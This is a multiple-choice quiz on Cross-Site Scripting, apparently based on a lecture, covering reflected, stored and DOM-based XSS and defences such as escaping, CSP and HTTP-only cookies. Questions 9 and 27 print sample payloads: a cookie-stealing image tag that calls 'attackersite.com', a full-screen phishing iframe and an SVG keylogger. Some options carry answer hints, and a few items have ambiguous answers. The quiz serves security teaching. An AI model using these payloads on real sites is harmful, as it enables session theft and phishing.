1.  Cross-Site Scripting (XSS) flaws occur when an application:
	a.  Uses strong encryption techniques to protect sensitive data in transit.
	b.  Properly validates user inputs before processing them on the server.
	c.  Takes untrusted data and sends it to a web browser without proper validation or escaping.
	d.  Implements a strict Content-Security Policy to control resource loading.

2.  According to the lecture, Cross-Site Scripting can allow attackers to perform actions such as:
	a.  Hijack user sessions, deface websites, or redirect users to malicious sites.
	b.  Bypass firewall rules and gain unauthorized network access.
	c.  Launch denial-of-service attacks to disrupt the availability of the web application.
	d.  Directly access the web server's file system and execute operating system commands.

3.  The lecture identifies several sources of "untrusted data" that can be exploited in XSS attacks. Which of the following is considered an untrusted data source?
	a.  HTTP status codes returned by the web server.
	b.  Server-side session variables that are not directly controlled by the user.
	c.  Data retrieved from a secure and validated database.
	d.  The URL and its query string.

4.  Which type of Cross-Site Scripting attack involves an attacker crafting a URL containing a malicious script and tricking a victim into requesting that URL from the vulnerable website?
	a.  Server-side XSS.
	b.  Stored XSS.
	c.  Reflected XSS.
	d.  DOM-based XSS.

5.  In a Reflected XSS attack, where does the malicious script typically originate?
	a.  It is part of the legitimate JavaScript code of the web application.
	b.  It is injected into the victim's browser through a compromised third-party website.
	c.  It is embedded within the URL or other user-provided input in the request.
	d.  It is permanently stored on the vulnerable web server's database.

6.  What is a key characteristic of Stored XSS (Persistent XSS) attacks?
	a.  These attacks are typically easier to detect because the malicious script is immediately visible in the URL.
	b.  The attack requires the victim to interact with a specially crafted URL each time.
	c.  The malicious script is only executed once, when the attacker crafts the initial request.
	d.  The injected script is saved by the web application and executed every time the affected page is loaded by a browser.

7.  The lecture mentions several functionalities in web applications that are often targets for Stored XSS. Which of the following is a common example?
	a.  Server-side log files.
	b.  Blog posts and comments sections.
	c.  HTTP request headers.
	d.  Secure authentication cookies.

8.  According to the lecture, what can inspecting the source code of a web page vulnerable to Stored XSS reveal?
	a.  The server-side validation rules implemented by the application.
	b.  Where the injected, persistent data has been rendered in the HTML.
	c.  The encryption algorithms used to protect user data.
	d.  The attacker's IP address and geographical location.

9.  The lecture provides examples of payloads used in Stored XSS attacks. What is the purpose of the following payload: `<img src='http://attackersite.com/index.php?cookie='+document.cookie />`?
	a.  To launch a denial-of-service attack against the web server.
	b.  To deface the web page by displaying a broken image.
	c.  To steal the victim's session cookie and send it to the attacker's server.
	d.  To redirect the user's browser to the attacker's website.

10. What is the primary goal of "escaping dynamic content" as a protection mechanism against XSS?
	a.  To prevent the browser from executing any JavaScript code within the dynamic content.
	b.  To filter out known malicious keywords and patterns from user inputs.
	c.  To treat potentially malicious characters in dynamic content as plain text rather than executable code.
	d.  To encrypt sensitive data before it is rendered in the browser.

11. The lecture mentions "HTML entity encoding" as a method of escaping dynamic content. What is the HTML entity encoding for the double quote character (")?
	a.  `&#34`
	b.  `&#x22;`
	c.  `&amp;`
	d.  `&quot;`

12. Which of the following XSS protection mechanisms involves providing users with a predefined set of acceptable input options, such as through a dropdown list?
	a.  Using a Content-Security Policy.
	b.  Whitelisting values.
	c.  HTML sanitization.
	d.  Implementing HTTP-only cookies.

13. What is the purpose of implementing a Content-Security Policy (CSP)?
	a.  To encrypt all HTTP traffic between the client and the server.
	b.  To define the sources from which the browser is allowed to load resources, thus mitigating XSS attacks.
	c.  To automatically detect and remove malicious scripts from web pages.
	d.  To prevent the storage of persistent cookies in the user's browser.

14. What is the role of "HTTP-only Cookies" in preventing XSS attacks?
	a.  They instruct the web browser to prevent client-side scripts (e.g., JavaScript) from accessing the cookie.
	b.  They prevent the cookie from being transmitted over unencrypted HTTP connections.
	c.  They automatically invalidate the session after a short period of inactivity.
	d.  They encrypt the cookie data, making it unreadable to attackers.

15. The lecture briefly mentions BeEF (Browser Exploitation Framework). What is the primary function of BeEF in the context of web browser security?
	a.  It is a penetration testing tool that can hook one or more web browsers and use them as beachheads for launching attacks.
	b.  It is a framework for building and deploying honeypots to detect and analyze attacker activity.
	c.  It is a web proxy used for intercepting and modifying HTTP traffic during penetration testing.
	d.  It is a tool used for secure code review and static analysis of web applications.

16. What is the significance of sanitizing HTML to prevent XSS?
	a.  It compresses the HTML code to reduce the page load time.
	b.  It converts all HTML into plain text, preventing any rendering of rich content in the browser.
	c.  It uses a library to parse HTML submissions and remove or neutralize any potentially malicious script content embedded within HTML tags.
	d.  It ensures that all HTML elements are properly formatted and closed.

17. According to the lecture, blacklisting to prevent XSS is considered:
	a.  Poor protection because it is difficult to anticipate and block all possible malicious patterns.
	b.  More secure than whitelisting because it allows for a broader range of acceptable inputs.
	c.  The most comprehensive method for filtering malicious input.
	d.  A highly effective and recommended approach.

18. In the context of XSS, what does "untrusted data" primarily refer to?
	a.  Data that is stored in a database without proper access controls.
	b.  Data that is transmitted over an unencrypted HTTP connection.
	c.  Any data that originates from a source outside of the application's direct control, such as user input.
	d.  Data that is processed on the client-side by JavaScript code.

19. The OWASP Top 10 list in 2021 ranked "Injection" (which includes XSS) as:
	a.  #7
	b.  #10
	c.  #3
	d.  #1

20. What is the potential impact of a successful Stored XSS attack?
	a.  The attacker gains direct access to the web server's operating system.
	b.  Any user who views the page containing the injected script can become a victim.
	c.  The attacker can only affect their own user account.
	d.  The malicious script is only executed if the attacker revisits the compromised page.

21.  An application takes user input from the URL query string and directly embeds it within the HTML structure of the response without any form of sanitization or encoding. This scenario is most directly vulnerable to which type of Cross-Site Scripting (XSS) attack?
	a) DOM-based XSS (not explicitly detailed but related).
	b) Reflected XSS.
	c) Server-side XSS (a broader category, but 'reflected' is more precise here based on the direct embedding).
	d) Persistent XSS.

22.  According to the lecture, which of the following sources of untrusted data, if improperly handled, could lead to an XSS vulnerability?
	a) The application's own JavaScript code files.
	b) Request headers sent by the client's browser.
	c) Server-side session identifiers stored in cookies (while related to session security, XSS exploits script execution).
	d) HTTP status codes returned by the server.

23.  The website `www.xssed.com` is mentioned in the lecture in the context of:
	a) Serving as a historical record of websites that have been vulnerable to XSS attacks.
	b) Providing a comprehensive guide to preventing XSS vulnerabilities.
	c) Offering tools and resources for ethical hackers to identify XSS flaws.
	d) Demonstrating the evolution of XSS payloads and exploitation techniques.

24.  Consider a scenario where an attacker crafts a malicious URL containing a JavaScript payload and tricks a victim into clicking it. The server then includes this payload directly in the HTML response that the victim's browser renders. This is a characteristic step in:
	a) Server-Side Request Forgery (SSRF), which targets server-side vulnerabilities.
	b) Reflected XSS, where the payload is part of the request and immediately reflected in the response.
	c) Stored XSS, where the payload is permanently saved on the server.
	d) DOM-based XSS, where the exploit manipulates the client-side DOM environment (while related, the lecture's example directly shows server reflection).

25.  The lecture contrasts blacklisting and whitelisting as approaches to data sanitization. Why is blacklisting described as providing "poor protection" against XSS?
	a) Because blacklisting is primarily effective against SQL Injection, not XSS.
	b) Because attackers can often find ways to bypass blacklisted patterns using alternative encodings or less obvious malicious strings.
	c) Because blacklisting requires constant updating to include newly discovered malicious patterns.
	d) Because blacklisting typically blocks all special characters, severely limiting legitimate user input.

26.  In a Stored XSS attack, where is the malicious script typically injected and subsequently executed?
	a) The attacker leverages vulnerabilities in the web server software to execute scripts directly on the server.
	b) The attacker directly modifies the client-side JavaScript code of the web application.
	c) The malicious script is stored in the application's data store (e.g., database) and executed whenever a page containing that data is loaded by a user's browser.
	d) The malicious script is embedded within HTTP cookies and executed by the browser on subsequent requests.

27.  The lecture provides examples of Stored XSS payloads. Which of the following payloads is explicitly given as an example of how an attacker might steal a victim's session cookie?
	a) `<iframe style='position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;'' src='http://faceboook.com/login.php' ></iframe>`
	b) `<script>alert(1);</script>` (This is a general alert, not specifically for cookie stealing in the example).
	c) `<img src='http://attackersite.com/index.php?cookie='+document.cookie />`.
	d) `<svg height="50px"><image xmlns:xlink="http://www.w3.org/1999/xlink"><set attributename="xlink:href" begin="accessKey(a)" to="http://x.x.x.x:8000/letter/a"></set> ... </svg>`

28.  The METRIC VALUE table in the "Stored XSS" section of the lecture assigns "Low" impact to Confidentiality, Integrity, and Availability despite the potential severity of XSS. This likely reflects:
	a) The fact that the direct impact of a single injected script might initially seem limited in scope from a CVSS perspective without further actions.
	b) An error in the lecture's presentation of CVSS scoring for XSS.
	c) A misunderstanding of the true risks associated with Stored XSS.
	d) The base CVSS score's immediate assessment of the vulnerability in isolation, without considering the potential for chained attacks or widespread impact after session hijacking or credential harvesting.

29.  Which of the following is a primary mechanism recommended in the lecture to protect against XSS by treating dynamic content within web pages?
	a) Implementing strong input validation on all user-supplied data on the client-side.
	b) Escaping dynamic content, often through HTML entity encoding, before rendering it in the browser.
	c) Using only POST requests for all data submissions to prevent URL-based XSS.
	d) Regularly scanning server-side code for potential XSS injection points.

30. Implementing a Content-Security Policy (CSP) is a recommended XSS protection. According to the example provided, `<meta http-equiv="Content-Security-Policy" content="script-src 'self' https://apis.google.com">`, what is the effect of this policy on script execution?
	a) It blocks all inline `<script>` tags and external script files.
	b) It encrypts all JavaScript code before it is transmitted to the browser.
	c) It allows scripts only from the application's own origin ('self') and from the specified domain `https://apis.google.com`.
	d) It allows scripts from any source to be executed, but only after user approval.

31. HTTP-only cookies are suggested as a measure against XSS. How do these cookies enhance security?
	a) They have a very short lifespan, limiting the window of opportunity for attackers to exploit them.
	b) They are encrypted using a strong algorithm, making their content unreadable to attackers.
	c) They are only transmitted over HTTPS connections, preventing interception by network sniffers.
	d) They cannot be accessed or manipulated by client-side JavaScript code, thus preventing attackers from stealing session cookies through XSS.

32. The lecture briefly introduces BeEF (Browser Exploitation Framework). What is the primary function of BeEF in the context of web application security testing?
	a) It primarily focuses on preventing Cross-Site Request Forgery (CSRF) attacks.
	b) It allows a penetration tester to hook one or more web browsers and use them as a platform to launch attacks against the host system from within the browser's context.
	c) It is a static code analysis tool for identifying potential XSS vulnerabilities in web application source code.
	d) It is a tool for performing server-side vulnerability scanning and exploitation.

33. Consider a web application that uses client-side JavaScript to dynamically generate parts of the DOM based on user-provided data without proper sanitization. While not explicitly termed in the OWASP Top 10 in the same way, this scenario is a prime example of a vulnerability often categorized as:
	a) Reflected XSS (though the reflection happens within the client).
	b) Server-Side Includes (SSI) injection.
	c) DOM-based XSS (where the vulnerability lies in the client-side script itself handling untrusted data).
	d) Stored XSS (if the user data is persisted and later used for DOM manipulation).

34. Why might a seemingly benign action like a "virtual sit-in" on a website providing illegal content, carried out through client-side scripting via XSS, raise ethical questions according to the lecture's broader discussion on hacktivism (even though Lecture 3 focuses on technical aspects)?
	a) Because it blurs the lines between activism and unauthorized access or modification of online resources, raising questions about the legitimacy and scope of such actions.
	b) Because it is always illegal to interact with websites hosting illegal content, regardless of the intent.
	c) Because any form of digital protest is inherently unethical.
	d) Because it could potentially disrupt legitimate services or impact innocent users.

35. In the context of XSS protection, why is simply using a well-known web application firewall (WAF) not a foolproof solution against all types of XSS attacks?
	a) Because WAFs are only effective against reflected XSS and offer no protection against stored XSS.
	b) Because WAFs operate at the server level and cannot inspect client-side JavaScript behavior, which is relevant for DOM-based XSS.
	c) Because WAFs primarily focus on preventing network-level attacks like DDoS.
	d) Because attackers constantly develop new techniques and payloads to bypass WAF rules, and WAFs might not be configured to catch all edge cases, especially in complex applications.

